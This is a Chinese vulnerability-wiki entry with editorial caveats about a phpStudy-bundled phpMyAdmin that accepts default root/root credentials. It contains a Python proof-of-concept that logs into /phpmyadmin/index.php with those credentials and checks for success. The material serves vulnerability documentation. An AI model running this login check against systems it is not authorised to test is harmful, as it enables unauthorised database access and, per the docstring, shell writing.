---
source: "白阁文库 BaizeSec/bylibrary"
title: "phpmyadmin_defaultpwd"
product: "phpStudy 捆绑的 phpMyAdmin/MySQL"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "部署使用脚本指定路径、数据库 root/root 凭据并允许该来源登录"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-7ebf717241b4c682a771c86b"
entity_id: "ve-7ebf717241b4c682a771c86b"
schema_version: "1"
---

# phpmyadmin_defaultpwd

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：部署使用脚本指定路径、数据库 root/root 凭据并允许该来源登录
- 证据范围：脚本尝试登录后以导航字符串判断成功；异常直接当不存在，main 未输出返回结果，不能据此证明可写 shell

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 应归类特定发行包/部署弱凭据而非 phpMyAdmin 通用默认密码
- HTML 代码围栏实际为 Python
- 没有版本、成功样例或权限影响论证

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

```HTML
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpstudy phpmyadmin默认密码漏洞
referer: wooyun-2015-094933
author: Lucifer
description: phpstudy的默认phpmyadmin后台存在默认用户名密码可写shell。
'''
import sys
import json
import requests
import warnings
def run(url):
        result = ['phpstudy phpmyadmin默认密码漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Content-Type":"application/x-www-form-urlencoded",
        }
        payload = "/phpmyadmin/index.php"
        vulnurl = url + payload
        post_data = {
            "pma_username":"root",
            "pma_password":"root",
            "server":"1",
            "target":"index.php"
        }
        try:
            sess = requests.Session()
            req = sess.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            req2 = sess.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"navigation.php" in req2.text and r"frame_navigation" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl+"\tpost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])


```


---

> 来源：白阁文库 BaizeSec/bylibrary
